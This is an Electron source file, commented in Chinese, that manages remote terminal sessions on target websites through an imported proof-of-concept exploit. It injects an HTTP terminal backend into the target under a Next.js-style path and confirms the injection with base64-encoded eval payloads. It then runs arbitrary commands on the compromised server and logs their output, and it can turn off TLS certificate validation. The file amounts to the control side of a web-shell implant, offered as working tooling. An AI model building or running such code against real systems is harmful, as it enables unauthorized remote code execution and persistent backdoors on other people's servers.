import { ipcMain } from 'electron'
import { executePOC } from './poc-handler.js'
import { injectHttpTerminalBackend } from './http-terminal-backend.js'
import { loadSettings } from './storage-handler.js'

/**
 * 终端会话管理
 */
const terminalSessions = new Map()

/**
 * 创建新的终端会话 - 使用 HTTP SSE 方式
 */
async function createTerminalSession(sessionId, url, apiPath = '/_next/data/terminal') {
  try {
    console.log(`正在注入 HTTP 终端后端到 ${url}...`)
    const injectResult = await injectHttpTerminalBackend(url, apiPath)

    if (!injectResult.success) {
      return {
        success: false,
        error: injectResult.error || '注入终端后端失败'
      }
    }

    const apiUrl = `${url}${apiPath}`

    // 测试后端是否成功注入
    console.log('测试后端注入状态...')
    const testCommand = `__EVAL__:${Buffer.from(
      `
      try {
        JSON.stringify({ 
          injected: global.__httpTerminalInjected === true,
          path: global.__httpTerminalPath
        });
      } catch(e) {
        JSON.stringify({ injected: false, error: e.message });
      }
    `
    ).toString('base64')}`

    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    const testResult = await executePOC(url, testCommand, settings)
    console.log('后端测试结果:', testResult.digest_content)

    const testData = testResult.digest_content
    if (!testData || !testData.includes('"injected":true')) {
      console.warn('警告: 终端后端可能未成功注入')
      console.warn('这可能导致 HTTP 请求失败')
    }

    terminalSessions.set(sessionId, {
      url,
      apiUrl,
      apiPath,
      connected: true,
      history: [],
      backendInjected: true,
      mode: 'http'
    })

    console.log('✓ HTTP 终端后端注入成功')

    return {
      success: true,
      sessionId,
      apiUrl,
      apiPath,
      mode: 'http',
      message: 'HTTP 终端后端注入成功，前端需要调用 create action'
    }
  } catch (error) {
    console.error('创建终端会话失败:', error)
    return {
      success: false,
      error: error.message
    }
  }
}

/**
 * 执行终端命令
 */
async function executeTerminalCommand(sessionId, command) {
  const session = terminalSessions.get(sessionId)
  if (!session) {
    return {
      success: false,
      error: '终端会话不存在'
    }
  }

  if (!session.connected) {
    return {
      success: false,
      error: '终端未连接'
    }
  }

  try {
    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    const result = await executePOC(session.url, command, settings)

    session.history.push({
      command,
      output: result.digest_content || result.response,
      timestamp: Date.now()
    })

    return {
      success: true,
      output: result.digest_content || '',
      isVulnerable: result.is_vulnerable,
      commandFailed: result.command_failed,
      failureReason: result.failure_reason
    }
  } catch (error) {
    return {
      success: false,
      error: error.message
    }
  }
}

/**
 * 关闭终端会话
 */
function closeTerminalSession(sessionId) {
  const session = terminalSessions.get(sessionId)
  if (session) {
    session.connected = false
    terminalSessions.delete(sessionId)
    return { success: true }
  }
  return { success: false, error: '会话不存在' }
}

/**
 * 通过 HTTP 创建终端会话（避免 CORS）
 */
async function httpCreateSession(createUrl) {
  // 保存原始的 TLS 设置
  const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED

  try {
    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    // 如果需要忽略证书错误，在全局层面设置
    if (settings?.ignoreCertErrors) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'
    }

    const axios = (await import('axios')).default
    const https = await import('https')

    // 构建 axios 配置
    const axiosConfig = {
      timeout: settings?.timeout || 10000,
      validateStatus: () => true
    }

    // 如果需要忽略证书错误，配置 agent
    if (settings?.ignoreCertErrors) {
      const agent = new https.Agent({
        rejectUnauthorized: false,
        servername: undefined,
        checkServerIdentity: () => undefined
      })
      axiosConfig.httpsAgent = agent
      axiosConfig.httpAgent = agent
    }

    const response = await axios.get(createUrl, axiosConfig)

    if (response.status === 200 && response.data) {
      return response.data
    } else {
      return {
        success: false,
        error: `HTTP ${response.status}: ${response.statusText}`
      }
    }
  } catch (error) {
    return {
      success: false,
      error: error.message
    }
  } finally {
    // 恢复原始的 TLS 设置
    if (originalRejectUnauthorized !== undefined) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized
    } else {
      delete process.env.NODE_TLS_REJECT_UNAUTHORIZED
    }
  }
}

/**
 * 通过 HTTP POST 发送终端输入
 */
async function httpSendInput(inputUrl, input) {
  // 保存原始的 TLS 设置
  const originalRejectUnauthorized = process.env.NODE_TLS_REJECT_UNAUTHORIZED

  try {
    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    // 如果需要忽略证书错误，在全局层面设置
    if (settings?.ignoreCertErrors) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0'
    }

    const axios = (await import('axios')).default
    const https = await import('https')

    // 构建 axios 配置
    const axiosConfig = {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: settings?.timeout || 5000,
      validateStatus: () => true
    }

    // 如果需要忽略证书错误，配置 agent
    if (settings?.ignoreCertErrors) {
      const agent = new https.Agent({
        rejectUnauthorized: false,
        servername: undefined,
        checkServerIdentity: () => undefined
      })
      axiosConfig.httpsAgent = agent
      axiosConfig.httpAgent = agent
    }

    const response = await axios.post(inputUrl, { input }, axiosConfig)

    if (response.status === 200 && response.data) {
      return response.data
    } else {
      return {
        success: false,
        error: `HTTP ${response.status}: ${response.statusText}`
      }
    }
  } catch (error) {
    return {
      success: false,
      error: error.message
    }
  } finally {
    // 恢复原始的 TLS 设置
    if (originalRejectUnauthorized !== undefined) {
      process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalRejectUnauthorized
    } else {
      delete process.env.NODE_TLS_REJECT_UNAUTHORIZED
    }
  }
}

/**
 * 注册终端相关的 IPC 处理器
 */
export function registerTerminalHandlers() {
  ipcMain.handle('terminal:create', async (_event, { url, apiPath }) => {
    const sessionId = `terminal-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`
    return createTerminalSession(sessionId, url, apiPath || '/_next/data/terminal')
  })

  ipcMain.handle('terminal:createSession', async (_event, { createUrl }) => {
    return httpCreateSession(createUrl)
  })

  ipcMain.handle('terminal:sendInput', async (_event, { inputUrl, input }) => {
    return httpSendInput(inputUrl, input)
  })

  ipcMain.handle('terminal:execute', async (_event, { sessionId, command }) => {
    return executeTerminalCommand(sessionId, command)
  })

  ipcMain.handle('terminal:close', async (_event, { sessionId }) => {
    return closeTerminalSession(sessionId)
  })

  ipcMain.handle('terminal:getSession', async (_event, { sessionId }) => {
    const session = terminalSessions.get(sessionId)
    if (session) {
      return {
        success: true,
        session: {
          url: session.url,
          connected: session.connected,
          historyCount: session.history.length
        }
      }
    }
    return { success: false, error: '会话不存在' }
  })
}
